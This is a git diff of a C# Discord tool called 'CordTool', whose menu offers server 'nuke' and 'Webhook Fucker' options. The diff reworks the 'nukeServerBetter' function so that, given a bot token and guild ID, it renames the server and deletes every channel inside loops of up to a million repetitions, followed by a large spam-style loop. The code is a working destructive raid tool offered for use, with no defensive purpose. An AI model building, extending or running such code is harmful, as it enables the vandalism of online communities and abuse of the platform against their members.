@@ -157,7 +157,7 @@ namespace CordTool
         static void Menu()
         {
             Console.WriteLine("\n1. Send Webhook Message");
-            Console.WriteLine("2. Nuke Server");
+            Console.WriteLine("2. Webhook Fucker");
             Console.WriteLine("3. Basic CLI discord client for bots");
             Console.WriteLine("4. Nuke Server Better (Reccommended)");
             Console.WriteLine("5. oAuth2 Authorization Tracker");
@@ -247,6 +247,8 @@ namespace CordTool
 
         public static async Task loginBot()
         {
+            Console.Clear();
+            loadinghaha();
             Console.Clear();
             Console.Write("Bot Token: ");
             string token = Console.ReadLine();
@@ -347,6 +349,8 @@ namespace CordTool
             static async void nukeServerBetter()
         {
             Console.Clear();
+            loadinghaha();
+            Console.Clear();
             Console.Write("Bot Token: ");
             string Token = Console.ReadLine();
 
@@ -358,24 +362,27 @@ namespace CordTool
 
             Console.Write("Discord invite link: ");
             string serverInvite = Console.ReadLine();
-            var discord = new DiscordClient(new DiscordConfiguration()
+            for (int i = 0; i < 1000000; i++)
+            {
+                var discord = new DiscordClient(new DiscordConfiguration()
                 {
                     Token = Token,
                     TokenType = TokenType.Bot
                 });
-            await discord.ConnectAsync();
 
-            var guild = await discord.GetGuildAsync(ulong.Parse(guildId)); // Your guild ID
-            await guild.ModifyAsync(g => g.Name = serverNameOverRide);
+                await discord.ConnectAsync();
 
-            await discord.DisconnectAsync();
+                var guild = await discord.GetGuildAsync(ulong.Parse(guildId)); // Your guild ID
+                await guild.ModifyAsync(g => g.Name = serverNameOverRide);
 
-            Console.WriteLine("Something is happening in the Nuke function.");
+                await discord.DisconnectAsync();
 
-            var channels = await guild.GetChannelsAsync();
-            foreach (var channel in channels)
-            {
-                try
+                Console.WriteLine("Something is happening in the Nuke function.");
+
+                var channels = await guild.GetChannelsAsync();
+                foreach (var channel in channels)
+                {
+                    try
                     {
                         await channel.DeleteAsync();
 
@@ -384,9 +391,9 @@ namespace CordTool
                     {
                         Console.WriteLine($"Something is happening in the Nuke function. [technical: {ex}]");
                     }
-            }
+                }
 
-            for (int j = 0; j < 100000; j++)
+                for (int j = 0; j < 100000; j++)
                 {
                     try
                     {
@@ -401,9 +408,12 @@ namespace CordTool
                         Console.WriteLine($"Something happened during the nuke, and we don't know how to fix it. Here's the error code: {ex.Message}");
                     }
                 }
+            }
         }
         static void releaseNotes()
         {
+            Console.Clear();
+            loadinghaha();
             Console.Clear();
             Console.WriteLine("Release Notes for CordTool");
             Console.WriteLine("Type the version below.");
@@ -448,9 +458,9 @@ namespace CordTool
                     break;
                 case '5':
                     Console.WriteLine("Version 5.0.0 - 5th release, bug fixes/updater.");
-                    Console.WriteLine("This version has a few bug fixes, and i added a bug fixer.");
+                    Console.WriteLine("This version has a few bug fixes, and i added a updater.");
                     Console.WriteLine("The updater will check for updates with GitHub's API, and make a batch file if it finds any newer versions.");
-                    Console.WriteLine("The updater will delete all files except the batch file, and then run the setup.exe that it downloaded. Then, it'll delete the batch file.");
+                    Console.WriteLine("Then, it will delete all files associated with CordTool except the batch file, and then run the batch file. Then, the script will get the setup.exe and lastly, it'll run the setup.exe and delete the batch file.");
                     Console.WriteLine("This version can be downloaded at: https://github.com/Epicinver/CordTool/releases/download/v4.0.0/Cordtool.zip");
                     Console.WriteLine("Click any key to exit.");
                     Console.ReadKey();
